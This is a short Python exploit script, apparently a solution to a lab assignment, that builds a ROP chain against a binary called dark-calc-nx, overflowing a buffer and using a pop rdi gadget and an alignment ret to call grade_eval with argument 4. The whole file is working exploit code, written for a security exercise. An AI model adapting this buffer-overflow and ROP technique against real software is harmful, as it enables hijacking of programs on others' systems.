#!/usr/bin/env python3
"""Task 3: ROP chain for attack/dark-calc-nx.

Gadgets inside 0x4019d0..0x401ae3:

    0x401a33 : pop rdi ; ret        (middle of `pop r15 ; ret`)
    0x401a34 : ret                  (stack alignment)

Chain: pop rdi; 4; ret; grade_eval; main.
The extra `ret` makes rsp 8 mod 16 at grade_eval's entry, which glibc's
printf requires (otherwise it may execute a movaps on a misaligned
address and crash).
"""
import struct
import sys


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


POP_RDI = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978
MAIN = 0x4019B4

payload = b"A" * 16
payload += p64(0x4444444444444444)
payload += p64(POP_RDI) + p64(4)
payload += p64(RET)
payload += p64(GRADE_EVAL)
payload += p64(MAIN)

assert b"\n" not in payload
sys.stdout.buffer.write(payload)
